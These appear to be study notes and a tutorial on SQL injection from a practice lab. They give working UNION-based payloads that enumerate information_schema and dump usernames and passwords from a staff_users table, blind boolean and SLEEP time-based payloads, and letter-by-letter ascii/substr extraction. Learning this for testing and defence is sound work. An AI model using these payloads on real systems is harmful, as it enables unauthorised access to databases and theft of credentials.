https://www.educba.com/mariadb-list-tables/
https://www.sqltutorial.org/sql-list-all-tables/

* `0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'`: `article,staff_users`
* The next thing is the information_schema database; every user of the database has access to this, and it contains information about all the databases and tables the user has access to. In this particular query, we're interested in listing all the tables in the sqli_one database, which is article and staff_users.
* `0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'`
* `0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users`
* Blind SQLi (boolean-based / Authentication Bypass=we use it to login without password)
* `where database() like '%';--`
* `FROM information_schema.tables WHERE table_schema = 'xxx' and table_name like 'a%';--`
* `FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='xxx' and TABLE_NAME='yyy' and COLUMN_NAME like '%';`. If multiple results, add a condition "COLUMN_NAME !='id'"
* admin123' UNION SELECT SLEEP(5);--
* If there was no pause in the response time, we know that the query was unsuccessful
* and length(table_name) =19
* analytics_referrers

<hr class="sr">

## Do the job manually

<div class="row row-cols-md-2"><div>

**Union-based SQLi** can only be achieved is the two queries have the same number of attributes in the SELECT, as per the property of the UNION clause. As such, hackers are simply adding "null", one by one if in a boolean-based scenario, until they found how much attributes were selected in the original query.

```sql
-- you don't known the query
SELECT [...] UNION SELECT NULL -- fail
SELECT [...] UNION SELECT NULL, NULL -- fail
SELECT [...] UNION SELECT NULL, NULL, NULL -- fail
SELECT [...] UNION SELECT NULL, NULL, NULL, NULL -- OK
```

In the case above, we know that there are 4 attributes in the select, even if we don't know which ones! Once we found the tables/column names, we will use that to fetch data.

Another way to get the number of column is used the property of ORDER BY. This clause can take an index, which is a shortcut for the $nth$ in the select. If you use an invalid $n$, then the requests fails.

```sql
-- you don't known the query
SELECT [...] ORDER BY 1 -- fail
SELECT [...] ORDER BY 2 -- fail
SELECT [...] ORDER BY 3 -- fail
SELECT [...] ORDER BY 4 -- OK
```
</div><div>

Now that you found the number of column, you should try to get some data from the database. In a **Union-based SQLi**, just use SQL commands, and have fun.

```sql
-- you don't known the query
SELECT [...]
UNION
-- tables
SELECT TABLE_NAME, NULL, NULL, NULL
FROM information_schema.TABLES
UNION
-- database + version + user
SELECT NULL, database(), @@version, user()
```

In a **Error-based SQLi**, the job will take LONGER ðŸ˜¢. You will have to try letter by letter. To find the first letter of the database, you will have to use iterative payloads such as

```
' AND (ascii(substr((select database()),1,1))) = ascii('a') -- -
' AND (ascii(substr((select database()),1,1))) = ascii('b') -- -
' AND (ascii(substr((select database()),1,1))) = ascii('c') -- -
[...]
' AND (ascii(substr((select database()),1,1))) = ascii('z') -- -
```

Then, process with the second, the third letter... Actually, there aren't that many DBMS, like, well, you could try some letters first.

</div></div>